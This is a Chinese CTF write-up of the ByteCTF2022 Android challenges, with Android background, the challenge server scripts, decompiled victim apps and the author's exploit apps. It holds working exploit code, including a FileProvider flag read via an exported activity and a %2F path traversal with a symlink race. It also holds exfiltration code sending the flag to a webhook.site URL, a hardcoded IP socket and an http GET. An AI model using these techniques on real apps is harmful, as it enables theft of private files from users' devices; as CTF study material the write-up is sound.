# ByteCTF2022 mobile系列

> 原文: https://www.ctfiot.com/87778.html
> ID: 87778

9月底就想复现了mobile题目，奈何当时时间有限，太过年轻，不能静下心来看整个题目的布置与攻击，这几天心血来潮，把题目复现了。

一

前置知识

现在很多App中都会内置html5界面，有时候会涉及到与android进行交互，这就需要用到WebView控件，WebView可以做到：

1.显示和渲染web界面2.直接使用html进行布局3.与js进行交互

创建WebView拥有两种方法，第一种方法是WebView webview = new WebView(getApplicationContext());创建；第二种是在xml文件内放在布局中；下面以第二种方法为例。

Activity_main.xml文件

<WebView android:id="@+id/eeeewebview" android:layout_width="0dp" android:layout_height="0dp" app:layout_constraintBottom_toBottomOf="parent" app:layout_constraintEnd_toEndOf="parent" app:layout_constraintStart_toStartOf="parent" app:layout_constraintTop_toTopOf="parent" />

MainActivity.java文件

public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
 // WebView WebView webView = (WebView) findViewById(R.id.eeeewebview); webView.loadUrl("https://www.baidu.com"); webView.setWebViewClient(new WebViewClient(){ @Override public boolean shouldOverrideUrlLoading(WebView view, String url) { //使用WebView加载显示url view.loadUrl(url); //返回true return true; } });

写完之后运行，发现报错，无法打开网页(net::ERR_CLEARTEXT_NOT_PERMITTED)， 经过搜索在manifest内设置usesCleartextTraffic为true即可。

可以看到百度已经被打开了，啊～因为这个app是我用来测试其他东西的，所以会看到三个奇奇怪怪的按钮。

Uri代表要操作的数据，Android上可用的每种资源 (图像、视频片段、网页等) 都可以用Uri来表示。从概念上来讲，UrI包括URL。

Uri的基本结构是

大致为[scheme:]scheme-specific-part[#fragment]细分为[scheme:][//authority][path][?query][#fragment]

path可以存在多个，以”/”连接 scheme://authority/path1/path2/path3?query#fragment

query可以带参数的返回值也可不带 scheme://authority/path1/path2/path3?id = 1#fragment

举例如下

http://www.eeeeeeeeeeeeeeeea.cn/about?id=1

scheme是在”:”之前，所以他匹配的是http。

authority是在”//”之后，所以www.eeeeeeeeeeeeeeeea.cn与其对应。

path自然对应的就是about这个页面。

query对应的是id=1。

在安卓内，除了authority和scheme必须存在，其他的可以选择性的要或者不要。

将一个url解析成uri对象的操作是Uri.parse(“http://www.baidu.com”)，就是将百度网址解析成一个uri对象，可以对其进行其他的各种操作了。

intent是各大组件之间通信的桥梁，Android有四个组件，分别是Activity，Service，Broadcast Receiver，Content Provider；组件之间可以进行通信，互相调用，从而形成一个app.

每个应用程序都有若干个Activity组成，每一个Activity都是一个应用程序与用户进行交互的窗口，呈现不同的交互界面。因为每一个Acticity的任务不一样，所以经常互在各个Activity之间进行跳转，在Android中这个动作是靠Intent来完成的。通过startActivity()方法发送一个Intent给系统，系统会根据这个Intent帮助你找到对应的Activity，即使这个Activity在其他的应用中，也可以用这种方法启动它。

intent包括两种，一是显式另一个是隐式。显式intent通常是已经知道要启动Activity的包名，多发于同一个app内；隐式intent只知道要执行的动作是什么，比如拍照，录像，打开一个网站。

那么隐式的intent如何启动一个组件呢呢？如果没有约束的话可能会造成一些后果，所以在Manifest文件内定义了intent-filter标签，如果组件中的intentfilter和intent中的intentfilter匹配，系统就会启动该组件，并把intent传给它；若有多个组件都符合，系统变会弹出一个窗口，任我们选择启动该intent的应用(app)。

在intent-filter标签中，我们可以选择三个intent的属性进行设置，包括action，category，data。

上图intent-filter定义的action为MAIN，代表app以这个activity开始。

该属性是显式intent特有的，表明要启动的类的全称，包括包名和类名。有它就意味着只有Component name匹配上的那个组件才能接收你发送出来的显式intent。

下面代码可以启动另一个app的主页面：

Intent intent = new Intent(Intent.ACTION_MAIN);intent.addCategory(Intent.CATEGORY_LAUNCHER); ComponentName cn = new ComponentName(packageName, className); intent.setComponent(cn);startActivity(intent);

一个activity是否能被其他app的组件启动取决于”android:exported”，true能，false不能。如果是false，这个activity只能被相同app的组件启动，或者是相同user ID的app的组件启动。

如果显式设置exported属性，不管这个activity有没有设置intent-filter,那么exported的值就是显式设置的值。

如果没有设置exported属性，那么exported属性取决于这个activity是否有intent-filter。

如有intent-filter,那么exported的值就是true。

如没有intent-filter,那么exported的值就是false。

一个字符串变量，用来指定Intent要执行的动作类别（比如：view or pick）。你可以在你的应用程序中自定义action，但是大部分的时候你只使用在Intent中定义的action，你可以通过Intent的setAction()方法设置action。

一个Uri对象，对应着一个数据。只设置数据的URI可以调用setData()方法，只设置MIME类型可以调用setType()方法，如果要同时设置这两个可以调用setDataAndType()。

一个包含Intent额外信息的字符串，表示哪种类型的组件来处理这个Intent。任何数量的Category 描述都可以添加到Intent中，你可以通过调用addCagegory()方法来设置category。

Intent可以携带的额外key-value数据，你可以通过调用putExtra()方法设置数据，每一个key对应一个value数据。你也可以通过创建Bundle对象来存储所有数据，然后通过调用putExtras()方法来设置数据。

用来指示系统如何启动一个Activity（比如：这个Activity属于哪个Activity栈）和Activity启动后如何处理它(比如：是否把这个Activity归为最近的活动列表中)。

二

题目环境布置

运行run.sh，我自己启动了一遍docker环境，修改了一些部分，最终发现是在server.py文件的setup_emulator()函数中没有模拟出来手机，只是创建了一个AVD环境，并没有emulator成功。

由于自己能力有限，实在不知道如何修好这个docker环境，便就此搁置，导致后面silver droid利用也不完全；如若后续进步，必定再战一次。

adb broadcast便是将服务器上的flag传给apk的FlagReceiver，通过adb shell进入手机，可以查看到flag被存到了”files/flag”内。

之前有一个疑问，便是manifest文件将Flagreceiver设置为exported为false和设置了intent-filter，防止外界app进行干扰，那么是怎么将flag传递给FlagReceiver呢？

由于root的情况下，是忽略掉exported的，所以可以对其进行广播。

am broadcast -W -a "com.wuhengctf.SET_FLAG" -n "com.bytectf.silverdroid/.FlagReceiver" -e 'flag' 'flag{eeeeeeee}'

通过intent传递url数据，下面可以通过-d选项来指定Intent data URI。

am start -a android.intent.action.VIEW -d https://www.baidu.com

下面的题目介绍，都是以pixel4为环境打的，因为docker我这边模拟不起来

同时记得自己写的apk要在AndroidManifest.xml内加两句话，可以让其有网络访问的权限。

<uses-permission android:name="android.permission.INTERNET"/>

<application android:usesCleartextTraffic="true"

三

Silver Droid

主要由攻击者提供一个url，在url内布置好exp，从而进行达到利用的目的，具体见代码块内分析。

#!/usr/bin/env python3import os import randomimport subprocessimport sysimport timeimport requestsimport uuidfrom hashlib import *import zipfileimport signalimport string
isMacos = len(sys.argv) == 2wordlist = string.ascii_lettersdifficulty = 4random_hex = lambda x: ''.join([random.choice(wordlist) for _ in range(x)])ADB_PORT = int(random.random() * 60000 + 5000)EMULATOR_PORT = 36666 if isMacos else (ADB_PORT + 1)EXPLOIT_TIME_SECS = 30APK_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "app-debug.apk")FLAG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "flag")HOME = "/home/user"VULER = "com.bytectf.silverdroid"

ENV = {}ENV.update(os.environ)if not isMacos: ENV.update({ "ANDROID_ADB_SERVER_PORT": "{}".format(ADB_PORT), "ANDROID_SERIAL": "emulator-{}".format(EMULATOR_PORT), "ANDROID_SDK_ROOT": "/opt/android/sdk", "ANDROID_SDK_HOME": HOME, "ANDROID_PREFS_ROOT": HOME, "ANDROID_EMULATOR_HOME": HOME + "/.android", "ANDROID_AVD_HOME": HOME + "/.android/avd", "JAVA_HOME": "/usr/lib/jvm/java-11-openjdk-amd64", "PATH": "/opt/android/sdk/cmdline-tools/latest/bin:/opt/android/sdk/emulator:/opt/android/sdk/platform-tools:/bin:/usr/bin:" + os.environ.get("PATH", "") })

def print_to_user(message): print(message) sys.stdout.flush()
def download_file(url): try: download_dir = "download" if not os.path.isdir(download_dir): os.mkdir(download_dir) tmp_file = os.path.join(download_dir, time.strftime("%m-%d-%H:%M:%S", time.localtime())+str(uuid.uuid4())+'.apk') f = requests.get(url) if len(f.content) > 10*1024*1024: # Limit size 10M return None with open(tmp_file, 'wb') as fp: fp.write(f.content) return tmp_file except: return None
def proof_of_work(): print_to_user(f"First, to ensure that the service will not be dos, please answer me a question.") prefix = random_hex(6) suffix = random_hex(difficulty) targetHash = sha256((prefix+suffix).encode()).hexdigest() print_to_user(f'Question: sha256(("{prefix}"+"{"x"*difficulty}").encode()).hexdigest() == "{targetHash}"') print_to_user(f'Please enter the {"x"*difficulty} to satisfy the above equation:') proof = sys.stdin.readline().strip() return sha256((prefix+proof).encode()).hexdigest() == targetHash

def check_apk(path): # return True try: z = zipfile.ZipFile(path) for f in z.filelist: if f.filename == "AndroidManifest.xml": return True return False except: return False
def setup_emulator():
 #avdmanager是一个命令行工具，可以用于从命令行创建和管理 Android 虚拟设备 (AVD)，借助 AVD，您可以定义要在 Android 模拟器中模拟的 Android 手机 subprocess.call( "avdmanager" + " create avd" + " --name 'pixel_xl_api_30'" + " --abi 'google_apis/x86_64'" + " --package 'system-images;android-30;google_apis;x86_64'" + " --device pixel_xl" + " --force" + ("" if isMacos else " > /dev/null 2> /dev/null"), env=ENV, close_fds=True, shell=True)
 return subprocess.Popen( "emulator" + " -avd pixel_xl_api_30" + " -no-cache" + " -no-snapstorage" + " -no-snapshot-save" + " -no-snapshot-load" + " -no-audio" + " -no-window" + " -no-snapshot" + " -no-boot-anim" + " -wipe-data" + " -accel on" + " -netdelay none" + " -no-sim" + " -netspeed full" + " -delay-adb" + " -port {}".format(EMULATOR_PORT) + ("" if isMacos else " > /dev/null 2> /dev/null ") + "", env=ENV, close_fds=True, shell=True, #通过操作系统的 shell 执行指定的命令 preexec_fn=os.setsid)
def adb(args, capture_output=True): #执行adb命令 return subprocess.run( # "adb {}".format(" ".join(args)) + # ("" if isMacos else " 2> /dev/null"), ['adb'] + (['-s', 'emulator-36666']+args if isMacos else args), env=ENV, # shell=True, close_fds=True, capture_output=capture_output).stdout
def adb_install(apk): adb(["install", "-t", apk])
def adb_activity(activity, extras=None, wait=False, data=None): args = ["shell", "am", "start"] if wait: args += ["-W"] args += ["-n", activity] if extras: for key in extras: args += ["-e", key, extras[key]] if data: args += ["-d", data] adb(args)
def adb_broadcast(action, receiver, extras=None): args = ["shell", "su", "root", "am", "broadcast", "-W", "-a", action, "-n", receiver] if extras: for key in extras: args += ["-e", key, extras[key]] adb(args)

print_to_user(r"""[0;1;35;95m░█[0;1;31;91m▀▀[0;1;33;93m░█[0;1;32;92m░░[0;1;36;96m░▀[0;1;34;94m█▀[0;1;35;95m░█[0;1;31;91m░█[0;1;33;93m░█[0;1;32;92m▀▀[0;1;36;96m░█[0;1;34;94m▀▄[0;1;35;95m░█[0;1;31;91m▀▄[0;1;33;93m░█[0;1;32;92m▀▄[0;1;36;96m░█[0;1;34;94m▀█[0;1;35;95m░▀[0;1;31;91m█▀[0;1;33;93m░█[0;1;32;92m▀▄[0m[0;1;31;91m░▀[0;1;33;93m▀█[0;1;32;92m░█[0;1;36;96m░░[0;1;34;94m░░[0;1;35;95m█░[0;1;31;91m░▀[0;1;33;93m▄▀[0;1;32;92m░█[0;1;36;96m▀▀[0;1;34;94m░█[0;1;35;95m▀▄[0;1;31;91m░█[0;1;33;93m░█[0;1;32;92m░█[0;1;36;96m▀▄[0;1;34;94m░█[0;1;35;95m░█[0;1;31;91m░░[0;1;33;93m█░[0;1;32;92m░█[0;1;36;96m░█[0m[0;1;33;93m░▀[0;1;32;92m▀▀[0;1;36;96m░▀[0;1;34;94m▀▀[0;1;35;95m░▀[0;1;31;91m▀▀[0;1;33;93m░░[0;1;32;92m▀░[0;1;36;96m░▀[0;1;34;94m▀▀[0;1;35;95m░▀[0;1;31;91m░▀[0;1;33;93m░▀[0;1;32;92m▀░[0;1;36;96m░▀[0;1;34;94m░▀[0;1;35;95m░▀[0;1;31;91m▀▀[0;1;33;93m░▀[0;1;32;92m▀▀[0;1;36;96m░▀[0;1;34;94m▀░[0m""")
if not isMacos: if not proof_of_work(): print_to_user("Please proof of work again, exit...n") exit(-1)
print_to_user("Please enter your poc url:")url = sys.stdin.readline().strip()# url should be like "https://xxx" to to ensure that `adb shell` passes intent.data correctly.if url.strip('"') == url: url = f'"{url}"'if not url.startswith('"https://'): print_to_user("Invalid poc url.n") exit(-1)
print_to_user("Preparing android emulator. This may takes about 2 minutes...n")emulator = setup_emulator()#只有连接上了模拟器/设备连接上了adb，服务才会被执行，而在Android系统完全启动前执行就会有错误发生adb(["wait-for-device"])
adb_install(APK_FILE) #将apk文件装到模拟器中with open(FLAG_FILE, "r") as f: adb_broadcast(f"com.wuhengctf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})#adb shell su root am broadcast -W -a "com.wuhengctf.SET_FLAG" -n "com.bytectf.silverdroid/.FlagReceiver" -e 'flag' 'flag{eeeeeeee}'#am broadcast 发送广播#-a com.wuhengctf.SET_FLAG:指定intent操作，如android.intent.action.VIEW,Intent intent = new Intent(); intent.setAction("android.SET_FLAG");#-n "com.bytectf.silverdroid/.FlagReceiver": 确定接收者#-e 'flag' 'flag{eeeeeeee}': 字符串

adb_activity(f"{VULER}/.MainActivity", wait=True, data=url)# adb shell am start -W -n "com.bytectf.silverdroid/.MainActivity" -d "url"#-n "com.bytectf.silverdroid/.MainActivity":启动MainActivity#-d "url":传递url给MainActivity，而silver droid程序通过Uri uri0 = this.getIntent().getData()接收url

print_to_user("Launching! Let your apk fly for a while...n")
if isMacos: input('wait for debug')else: time.sleep(EXPLOIT_TIME_SECS)
print_to_user("exiting......")
try: os.killpg(os.getpgid(emulator.pid), signal.SIGTERM) os.killpg(os.getpgid(os.getpid()), signal.SIGTERM)except: pass

使用jeb打开apk，MainActivity如下：

package com.bytectf.silverdroid;
import android.net.Uri;import android.os.Bundle;import android.util.Log;import android.webkit.WebResourceRequest;import android.webkit.WebResourceResponse;import android.webkit.WebView;import android.webkit.WebViewClient;import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.util.HashMap;
public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main Uri uri0 = this.getIntent().getData(); //获得intent所传过来的data参数，可以来自另一个app if(uri0 != null) { //若参数不为null WebView webView = new WebView(this.getApplicationContext());//新建的页面取得是整个app的context webView.setWebViewClient(new WebViewClient() { //当从一个网页跳转到另外一个网页时，我们希望目标网页仍然在当前的webview中显示，而不是在浏览器中打开 @Override // android.webkit.WebViewClient public boolean shouldOverrideUrlLoading(WebView view, String url) { //当shouldOverrideUrlLoading返回值为true，拦截webview加载url try { Uri uri0 = Uri.parse(url); //解析url Log.e("Hint", "Try to upload your poc on free COS: https://cloud.tencent.com/document/product/436/6240"); if(uri0.getScheme().equals("https")) { //scheme必须是https return !uri0.getHost().endsWith(".myqcloud.com");//若是以.myqcloud.com结尾，返回true，再取反返回false，不会拦截webview加载url } } catch(Exception e) { e.printStackTrace(); return true; }
 return true; } }); webView.setWebViewClient(new WebViewClient() { @Override // android.webkit.WebViewClient public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) { //拦截url，js，css等响应阶段,拦截所有的url请求，若返回非空，则不再进行网络资源请求，而是使用返回的资源数据 FileInputStream inputStream; Uri uri0 = request.getUrl(); //获得js请求的request if(uri0.getPath().startsWith("/local_cache/")) { //检查域名后的path是否为/local_cache/开头 File cacheFile = new File(MainActivity.this.getCacheDir(), uri0.getLastPathSegment()); //只是在内存中创建File文件映射对象,而并不会在硬盘中创建文件，新建file以cache为目录，uri0的最后一个地址段 //getCacheDir获取手机中/data/data/包名/cache目录；
 if(cacheFile.exists()) { //若映射的文件真实存在，则进入下面循环 try { inputStream = new FileInputStream(cacheFile);//其将文件内容读取到了内存inputStream内，之后可以进行读取操作 } catch(IOException e) { return null; }
 HashMap headers = new HashMap(); headers.put("Access-Control-Allow-Origin", "*"); return new WebResourceResponse("text/html", "utf-8", 200, "OK", headers, inputStream); //返回响应 } }
 return super.shouldInterceptRequest(view, request); } }); this.setContentView(webView); // webView.getSettings().setJavaScriptEnabled(true); //设置WebView属性，能够执行Javascript脚本 webView.loadUrl("https://bytectf-1303079954.cos.ap-nanjing.myqcloud.com/jump.html?url=" + uri0); } }}

经过分析可知，MainActivity先loadUrl，从判断传入的intent是否符合https开头，以.myqcloud.com结尾，若符合；在请求js脚本的内容时会拦截其响应，对js脚本的response地址进行检查，则返回响应时修改响应数据。

主要功能就是提供一个检查并且打开传入的url地址。

<h1>jump</h1><script> function getQueryVariable(variable){ var query = window.location.search.substring(1); //window.location是获得当前页面的url地址，添上search之后表示从"?"开始的url，而substring(1)就是将"?"截掉。
 var vars = query.split("&"); //把query以"&"进行分割 for (var i=0;i<vars.length;i++) { var pair = vars[i].split("="); if(pair[0] == variable){return pair[1];} } return(false); //获得url参数 } var myurl = getQueryVariable("url").toString().toLowerCase();// if (myurl != 'false' && myurl.length > 1 && myurl.indexOf("myqcloud")==-1) { //myurl不能含有myqcloud window.location.href = myurl; //只表示打开这个url页面，并不是打开且刷新这个页面 }</script>

经过分析得知我们传入的poc必须以”https”开头，在webview中处理时以”myqcloud.com”结尾，但是在jump.html跳转页面时不包含myqcloud，需要用到字符转换之类。

由于是赛后复现，观察其他师傅的wp发现，我们js脚本中的请求url必须包含有flag文件，我自己也尝试过在几个服务器内部部署一个flag文件，可能是由于docker启动的问题，导致网络不稳定，一直请求不到。

将此js文件放到https://bytectf-1314169455.cos.ap-nanjing.myqcloud.com内。

<script> async function fetchTest(){
 fetch("https://webhook.site/bf5aa6d4-1b89-4eaf-a1dd-9b003555cd99/?flag=123")} (async () => {await fetchTest();})();</script>

四

Bronze Droid

打开apk之前，先大概看了一眼docker和启动环境的脚本，和Silver Droid的大致一样，其中server.py的实现便不同，大致便是由攻击者实现一个恶意apk，将题目提供的apk和自己实现的apk均安装到模拟器内，启动恶意apk的MainActivity来获得flag。

由于篇幅，下面server.py代码仅复制与上面不一样的地方。

print_to_user("Please enter your apk url:")url = sys.stdin.readline().strip()EXP_FILE = download_file(url)if not check_apk(EXP_FILE): print_to_user("Invalid apk file.n") exit(-1)
print_to_user("Preparing android emulator. This may takes about 2 minutes...n")emulator = setup_emulator()adb(["wait-for-device"])
adb_install(APK_FILE) #安装受害者apkwith open(FLAG_FILE, "r") as f: adb_broadcast(f"com.bytectf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})
time.sleep(3)adb_install(EXP_FILE) #安装恶意apkadb_activity(f"{ATTACKER}/.MainActivity") #启动恶意apk的MainActivity
print_to_user("Launching! Let your apk fly for a while...n")

看代码如下，一眼看去好短。

package com.bytectf.bronzedroid;
import android.app.Activity;import android.os.Bundle;
public class MainActivity extends Activity { @Override // android.app.Activity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main String s = this.getIntent().getAction(); //获得启动该Activity的intent的Action属性 if(s != null && (s.equals("ACTION_SHARET_TO_ME"))) { //判断 this.setResult(-1, this.getIntent()); //将某些数据回带给启动该Activity的Activity this.finish(); } }}

MainActivity的exported属性为true，所以可以通过外部app来启动MainActivity，具体利用思路可以是编写的恶意apk自带uri来访问受害者apk的flag文件，然后受害者app通过setResult将flag回带给恶意apk。

想要读取flag文件，需要利用fileprovider，可知authority是com.bytectf.bronzedroid.fileprovider，所以intent的data为content://com.bytectf.bronzedroid.fileprovider/root/data/data/com.bytectf.bronzedroid/files/flag

恶意apk的MainActivity如下，下面的MainActivity可以进行本地测试；如果打远程需要将flag通过http回传到服务器。

package com.eeeetest.bronzedroid_pwn;
import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;import android.net.Uri;import android.os.Bundle;import android.util.Log;import android.widget.TextView;
import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.io.OutputStream;import java.net.HttpURLConnection;import java.net.Socket;import java.net.URL;
public class MainActivity extends AppCompatActivity {
 @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);

 Intent intent = new Intent(); intent.setAction("ACTION_SHARET_TO_ME"); intent.setClassName("com.bytectf.bronzedroid","com.bytectf.bronzedroid.MainActivity"); intent.setData(Uri.parse("content://com.bytectf.bronzedroid.fileprovider/root/data/data/com.bytectf.bronzedroid/files/flag")); intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); startActivityForResult(intent,1); }
 @Override //重写 public void onActivityResult(int requestCode, int resultCode, Intent data) { //得到回传的数据 super.onActivityResult(requestCode, resultCode, data); //重写 try { InputStreamReader inputStreamReader = new InputStreamReader(getContentResolver().openInputStream(data.getData())); char[] cArr = new char[1024]; StringBuffer stringBuffer = new StringBuffer(""); while (-1 != inputStreamReader.read(cArr, 0, 1024)) { stringBuffer.append(String.valueOf(cArr)); } //send(new String(stringBuffer)); String flag = new String(stringBuffer); ((TextView) findViewById(R.id.tv_show)).setText(new String(stringBuffer));

 } catch (Exception e) { e.printStackTrace(); } } }

若想回传flag，只需要在恶意apk内增加一个httpGet功能，然后在服务器内监听一下，代码如下：

private void send(final String str) { //和服务器建立socket通信，将flag带入到服务器内 new Thread() { @Override public void run() { try { Socket socket = new Socket("47.101.67.103", 1235); sleep(1000L); if (socket.isConnected()) { System.out.println("connect succeed!"); OutputStream outputStream = socket.getOutputStream(); outputStream.write(str.getBytes()); outputStream.flush(); outputStream.close(); socket.close(); } } catch (Exception unused) { } } }.start();}

五

Gold Droid

和前两题又不一样，这题先运行了受害apk的main，然后再运行恶意apk的main来拿到flag。

print_to_user("Please enter your apk url:")url = sys.stdin.readline().strip()EXP_FILE = download_file(url)if not check_apk(EXP_FILE): print_to_user("Invalid apk file.n") exit(-1)
print_to_user("Preparing android emulator. This may takes about 2 minutes...n")emulator = setup_emulator()adb(["wait-for-device"])
adb_install(APK_FILE) #安装受害apkadb_activity(f"{VULER}/.MainActivity") ###### 启动受害apk的MainActivitywith open(FLAG_FILE, "r") as f: adb_broadcast(f"com.bytectf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()}) #发送flag
time.sleep(3)adb_install(EXP_FILE)adb_activity(f"{ATTACKER}/.MainActivity") #运行恶意apk的MainActivity
print_to_user("Launching! Let your apk fly for a while...n")
if isMacos: input('wait for debug')else: time.sleep(EXPLOIT_TIME_SECS)
print_to_user("exiting......")

代码看起来没有什么漏洞，只是创建了一个文件并向内部写入” I’m in external”。

package com.bytectf.golddroid;
import android.os.Bundle;import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.nio.charset.StandardCharsets;
public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main File externalFile = new File(this.getExternalFilesDir("sandbox"), "file1"); //getExternalFilesDir对应的目录是/sdcard/Android/data/包名/files/，映射sandbox文件夹内的file1文件 try { FileOutputStream fileOutputStream = new FileOutputStream(externalFile); //创建externalFile文件 fileOutputStream.write("I'm in externaln".getBytes(StandardCharsets.UTF_8)); //写入 fileOutputStream.close(); } catch(IOException e) { e.printStackTrace(); } }}

VulProvider好像存在漏洞的样子。

VulProvider使用了ContentProvider将应用程序的数据暴露给外界。

如何通过一套标准及统一的接口获取其他应用程序暴露的数据？Android提供了ContentResolver，外界的程序可以通过ContentResolver接口访问ContentProvider提供的数据。ContentResolver是通过URI来获取Provider所提供的数据。

package com.bytectf.golddroid;
import android.content.ContentProvider;import android.content.ContentValues;import android.database.Cursor;import android.net.Uri;import android.os.ParcelFileDescriptor;import java.io.File;import java.io.FileNotFoundException;import java.io.IOException;
public class VulProvider extends ContentProvider { // @Override // android.content.ContentProvider public int delete(Uri uri, String selection, String[] selectionArgs) { return 0; }
 @Override // android.content.ContentProvider public String getType(Uri uri) { return null; }
 @Override // android.content.ContentProvider public Uri insert(Uri uri, ContentValues values) { return null; }
 @Override // android.content.ContentProvider public boolean onCreate() { return false; }
 @Override // android.content.ContentProvider public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException { File file0 = this.getContext().getExternalFilesDir("sandbox"); // file0 = /sdcard/Android/data/com.bytectf.golddroid/files/sandbox/ File file = new File(this.getContext().getExternalFilesDir("sandbox"), uri.getLastPathSegment()); // // file = /sdcard/Android/data/com.bytectf.golddroid/files/sandbox/uri.getLastPathSegment() try { if(!file.getCanonicalPath().startsWith(file0.getCanonicalPath())) { //防止目录穿越,getCanonicalPath会将目录中存在./和../的路径全部转化成没有./和../的路径，下面例子 //Path: workspace/test/../../../.././test1.txt //getAbsolutePath:/Users/eeee/Desktop/CTF/ByteCTF/Gold_Droid/workspace/test/../../../.././test1.txt //getCanonicalPath: /Users/eeee/Desktop/CTF/test1.txt throw new IllegalArgumentException(); } } catch(IOException e) { e.printStackTrace(); }
 return ParcelFileDescriptor.open(file, 0x10000000); //0x10000000代表只读 }
 @Override // android.content.ContentProvider public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { return null; }
 @Override // android.content.ContentProvider public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) { return 0; }}

public static ParcelFileDescriptor open(File file, int mode) throws FileNotFoundException { final FileDescriptor fd = openInternal(file, mode); if (fd == null) return null; return new ParcelFileDescriptor(fd);}

private static FileDescriptor openInternal(File file, int mode) throws FileNotFoundException { final int flags = FileUtils.translateModePfdToPosix(mode) | ifAtLeastQ(O_CLOEXEC); int realMode = S_IRWXU | S_IRWXG; if ((mode & MODE_WORLD_READABLE) != 0) realMode |= S_IROTH; if ((mode & MODE_WORLD_WRITEABLE) != 0) realMode |= S_IWOTH; final String path = file.getPath(); //重新获得了path，没有用getCanonicalPath过滤，这样就存在目录穿越 try { return Os.open(path, flags, realMode); } catch (ErrnoException e) { throw new FileNotFoundException(e.getMessage()); }}

如果是普通文件，file.getAbsolutePath()和file.getCanonicalPath()是一样。

如果是link文件，file.getAbsolutePath()是链接文件的路径；file.getCanonicalPath是实际文件的路径（所指向的文件路径）。

记住一定要执行adb shell setenforce 0 暂时关闭 selinux 进行验证。不然会被坑惨，三天我才找到这个。

如果不关闭的话，file.getCanonicalPath是不会得到文件的软链接的路径，所以导致file.getCanonicalPath().startsWith(file0.getCanonicalPath())这个if判断过不去。

介绍：https://blog.csdn.net/a572423926/article/details/123261874

我写了一个demo，大家可以试试看，挺好玩的。

package com.bytectf.test;
import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.IOException;

import android.net.Uri;import android.os.Bundle;
public class MainActivity extends AppCompatActivity {
 @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); File file0 = new File("/data/data/com.bytectf.pwngolddroid/","cache"); //取得相对路径 System.out.println("file0 Path: " + file0.getPath());
 String path = "content://slipme/" + "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink"; Uri uri = Uri.parse(path); System.out.println("uri.getLastPathSegment:"+uri.getLastPathSegment()); //利用"%2F"绕过getLastPathSegment，让其存在目录穿越
 File file = new File(this.getExternalFilesDir("sandbox"),"../../../../../../../../data/data/com.bytectf.pwngolddroid/symlink"); File file1 = new File(this.getExternalFilesDir("sandbox"),uri.getLastPathSegment()); File file2 = new File(this.getExternalFilesDir("sandbox"),"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink"); System.out.println("file Path: " + file.getPath()); System.out.println("file1 Path: " + file1.getPath()); System.out.println("file2 Path: " + file2.getPath()); try { System.out.println("file1.getCanonicalPath:"+file1.getCanonicalPath()); } catch (IOException e) { e.printStackTrace(); }
 try { if(!file1.getCanonicalPath().startsWith(file0.getCanonicalPath())) { ///////////// throw new IllegalArgumentException(); } } catch(IOException e) { e.printStackTrace(); } //取得绝对路径// try{// System.out.println("getCanonicalPath: "+ file.getCanonicalPath()); }// catch(Exception e){} }

 }

用”%2F”绕过getLastPathSegment；

那么我一开始想不到我们编写的apk如何与目标apk进行交流，如何启动目标apk的VulActivity，一方面需要请求受害者apk的VulProvider，另一方面需要进行线程竞争和软链接，当软链接合法的时候通过openFile的检测，进入ParcelFileDescriptor.open，这时如果凑巧非法链接到了flag文件，便可以得到flag了。

如果运行程序的话，可以观察到在手机里symlink文件的软链接一直在被切换，一是指向flag这个非法路径，二是指向sandbox/file1这个合法路径。

由于我是用安卓机复现，所以让其指向了非法的flag文件和合法的/sandbox/file1便结束了(我不会说是我试了两天还没竞争出来)，三天后，解决了这个问题，已破案。原因上面已说。

MainActivity如下：

package com.bytectf.pwngolddroid;
import androidx.appcompat.app.AppCompatActivity;import android.content.ContentResolver;import android.net.Uri;import android.os.Bundle;import android.util.Log;
import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.net.HttpURLConnection;import java.net.URL;

public class MainActivity extends AppCompatActivity { String symlink;
 public void httpGet(String msg) { new Thread(new Runnable() { @Override public void run() { HttpURLConnection connection = null; BufferedReader reader = null; try { Log.e("in_httpGet","inHttpGet1"); URL url = new URL("http://ip:port/flag?flag=" + msg); //这里可以写自己博客的ip和端口，对其进行访问，然后查看日志，我的日志在/var/log/nginx/access.log Thread.sleep(1); Log.e("in_httpGet","inHttpGet2"); connection = (HttpURLConnection) url.openConnection(); Thread.sleep(1); Log.e("in_httpGet","inHttpGet3"); connection.setRequestMethod("GET"); Thread.sleep(1); Log.e("in_httpGet","inHttpGet4"); connection.getInputStream(); Thread.sleep(1); Log.e("httpget succeed","http_get succeed"); } catch (IOException | InterruptedException e) { e.printStackTrace(); } } }).start(); }
